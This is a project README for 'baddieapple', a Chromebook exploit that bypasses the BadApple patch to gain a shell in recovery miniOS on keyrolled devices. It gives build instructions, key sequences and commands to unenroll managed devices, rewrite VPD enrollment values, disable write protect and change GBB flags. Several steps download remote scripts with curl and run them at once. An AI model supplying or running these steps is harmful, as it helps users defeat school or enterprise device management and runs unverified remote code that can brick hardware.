# baddieapple
![baddieapple](https://cdn.crosbreaker.dev/baddieapple.png)
baddieapple allows code execution in developer mode recovery on kv5 and kv6 [v3 disk layout](#supported-devices) Chromebooks, similar to sh1mmer but for keyrolled devices.  This bypasses the [BadApple patch](https://crrev.com/c/6073625).
# Support
If you need any kind of support, please join our [discord server](https://discord.gg/crosbreaker-1375357349425971231) for help
## Why is this useful?
At the time of me writing this, this can be used for the following:  **[Quicksilver](#quicksilver) (unenrollment up to R143)**, **[Recover to any version](#recovery-selector)**, **[br0ker (unenrollment up to R133)](#br0ker)**, **[daub](#daub)**, **[appleboot](https://github.com/applefritter-inc/appleboot)**, [unkeyroll](#unkeyroll) (only works if write protect is ALREADY disabled), [mrchromebox script](#mrchromebox-script) and [pencil sharpener](#pencil-sharpener) (not recommended).

>[!CAUTION]
>This exploit is patchecd on R143 via [c/6839636](https://crrev.com/c/6839636)
## How to use

You will need:
- A USB drive or SD card (8 GB or larger)
- Something to flash the image (dd, rufus, chromebook recovery utility, etc.)

Instructions to create a image:

```
git clone https://github.com/crosbreaker/baddieapple.git
cd baddieapple
sudo ./builder_baddieapple.sh <board> <OPTIONAL:version (default is 139 if unset)>
```
NOTE:  If this version doesn't work for you, check out [no_minios_prebuilt.sh](./no_minios_prebuilt.sh). You can also use this if you do not trust the extracted miniOS versions hosted on this repository.  However, there can't be any modifications made due to miniOS being signed so it doesn't make much of a difference ethier way.

## On Chromebook usage instructions:
1. Recover to the image outputted by the program
2. Enter developer mode with `ESC` + `REFRESH` + `POWER` and `CTRL` + `D`
3. When you reach the block screen, press `ESC` + `REFRESH` + `POWER` again
4. Select Internet Recovery
5. When miniOS loads in, press `CTRL` + `ALT` + `F3` (open VT3)
## Why does this work?
Google forgot to increase the miniOS kernver (yes, it is seperate from the normal kernver) after pushing the original BadApple patch. Allowing us to downgrade miniOS using a modified recovery image, as recovery images don't check either. Funnly enough, they mentioned doing it, but didn't think about recovery image modification (see [comment #4 of the orginal BadApple report](https://issuetracker.google.com/issues/382540412#comment4))
### Quicksilver
To unenroll on 142 and below, run the following:
```bash
vpd -i RW_VPD -s re_enrollment_key="$(openssl rand -hex 32)"
```
### Recovery Selector
To recover to ANY version via miniOS (with wifi) connect to a wifi network, and run this in the terminal
```bash
curl -LO https://ba.crosbreaker.dev/recovery_selector.sh && sh recovery_selector.sh {versiontorecoverto}
```
### daub
To use daub while in BadApple or baddieapple, connect to a wifi network, and run this in the terminal
```bash
curl -LO https://ba.crosbreaker.dev/daub.sh && sh daub.sh
```

### br0ker
To unenroll your device (remove fwmp) while in baddieapple, first make sure you're on kernver 5, connect to a wifi network, and run this in the terminal.  This will not work on kernver 6.
```bash
curl -LO https://ba.crosbreaker.dev/br0ker.sh && sh br0ker.sh
```
### Unkeyroll
NOTE:  Write protect must already be disabled for this to work.

To unkeyroll while in BadApple or baddieapple, connect to a wifi network, and run this in the terminal

```bash
curl -LO https://ba.crosbreaker.dev/ba/unkeyroll.sh && sh unkeyroll.sh
```
### mrchromebox script
Run the mrchromebox script in baddieapple:
```bash
curl -LO https://ba.crosbreaker.dev/mrchromebox.sh && sh mrchromebox.sh
```
### Pencil Sharpener
This section has modified steps for [Pencil Shapener](https://github.com/truekas/PencilSharpener) in a miniOS shell (BadApple)
1. ENSURE YOUR DEVICE IS BELOW v136, IF IT IS ABOVE YOU WILL LIKELY BRICK
2. Follow the [orginal steps](https://github.com/truekas/PencilSharpener), until you get to the section asking to use sh1mmer to unenroll, once this section is reached open your miniOS shell (see [instructions](#on-chromebook-usage-instructions)) and enter the following commands:
```bash
crossystem block_devmode=0
vpd -i RW_VPD -s check_enrollment=0 -s block_devmode=0
flashrom --wp-disable
futility gbb -s --flash --flags=0x80b3
flashrom --wp-enable
``` 
Alternatively, you can use the [Unkeyroll](#Unkeyroll) section at the same point, then booting a shim to do the rest of the work.
## Prebuilts?

[dl.crosbreaker.dev (fast)](https://dl.crosbreaker.dev/ChromeOS/modified-recovery/baddieapple/)

[GitHub large releases (slower)](https://github.com/crosbreaker/baddieapple/releases/latest)

~~[GitHub actions (slowest)](https://nightly.link/crosbreaker/baddieapple/actions/runs/21697410779)~~ down temporarily 

## Credits
- [HarryTarryJarry](https://github.com/HarryTarryJarry) - Making this repo, and most scripts.  Also miniOS daub, miniOS Pencil Sharpener, miniOS br0ker, and the miniOS unkeyrolling script.
- [fast218](https://github.com/fastcoder218) - Thinking of the orginal idea
- [applefritter](https://github.com/applefritter-inc) - Finding the orginal [BadApple](https://github.com/applefritter-inc/BadApple), creating [appleboot](https://github.com/applefritter-inc/appleboot) (making this much more useful.)  Also finding this independently and not fedding it.
- [BinBashBanana](https://github.com/BinBashBanana) - Helping us with the original POC
- [codenerd87](https://github.com/codenerd87) - Finding this independently and not fedding it, miniOS extractor.
- [crossjbly](https://github.com/crossjbly) - emotional support
- Fanqyxl - emotional support (fanqyxl mind disease)
